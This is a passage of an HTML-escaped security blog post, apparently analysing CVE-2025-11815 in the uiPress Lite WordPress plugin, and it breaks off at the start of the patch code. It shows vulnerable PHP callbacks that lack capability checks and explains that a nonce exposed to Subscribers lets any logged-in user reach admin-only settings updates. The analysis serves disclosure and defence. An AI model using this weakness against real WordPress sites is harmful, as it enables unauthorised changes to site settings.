class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;wp_ajax_&lt;/code&gt; prefix indicates that these AJAX actions only run for logged-in users.&lt;/p&gt;&#xA;&lt;p&gt;In the vulnerable &lt;strong&gt;v3.5.08&lt;/strong&gt;, none of the callbacks perform capability checks. For example:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;uip_save_site_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$option&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;option&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$option&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Sanitize&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;clean_input_with_code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$optionName&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;optionName&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$optionName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;No&amp;ensp;option&amp;ensp;name&amp;ensp;specified&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;UipOptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$optionName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$returndata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$returndata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Option&amp;ensp;saved&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$returndata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function updates the &lt;code&gt;uip-global-settings&lt;/code&gt; option in the database using &lt;code&gt;option&lt;/code&gt; and &lt;code&gt;optionName&lt;/code&gt; taken directly from the POST request.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$newValue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip-global-settings&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$newValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$newValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;update_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip-global-settings&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This option is stored in the &lt;code&gt;wp_options&lt;/code&gt; table with &lt;code&gt;option_name&amp;ensp;=&amp;ensp;&#39;uip-global-settings&#39;&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql&amp;gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&amp;ensp;*&amp;ensp;from&amp;ensp;wp_options&amp;ensp;where&amp;ensp;&lt;span class=&#34;nv&#34;&gt;option_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uip-global-settings&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+------------------------------------------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_id&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_name&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_value&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;autoload&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+------------------------------------------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;m&#34;&gt;363&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;uip-global-settings&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;a:1:&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;s:11:&lt;span class=&#34;s2&#34;&gt;&amp;#34;remote-sync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;a:1:&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;s:3:&lt;span class=&#34;s2&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;s:27:&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;auto&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+------------------------------------------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&amp;ensp;row&amp;ensp;in&amp;ensp;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00&amp;ensp;sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Although &lt;code&gt;Ajax::check_referer()&lt;/code&gt; enforces CSRF protection using a &lt;code&gt;security&lt;/code&gt; nonce:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$doingAjax&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;DOING_AJAX&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;DOING_AJAX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$referer&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;check_ajax_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip-security-nonce&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;security&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$doingAjax&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;self&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Unable&amp;ensp;to&amp;ensp;perform&amp;ensp;action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This nonce appears in the Dashboard of every logged-in user, including Subscribers. However, the AJAX actions themselves are intended only for admin users.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#34; title=&#34;Nonce in admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce in admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;215&#34; width=&#34;838&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce in admin Dashboard&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patch &lt;strong&gt;v3.5.09&lt;/strong&gt;, the developer added capability checks:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 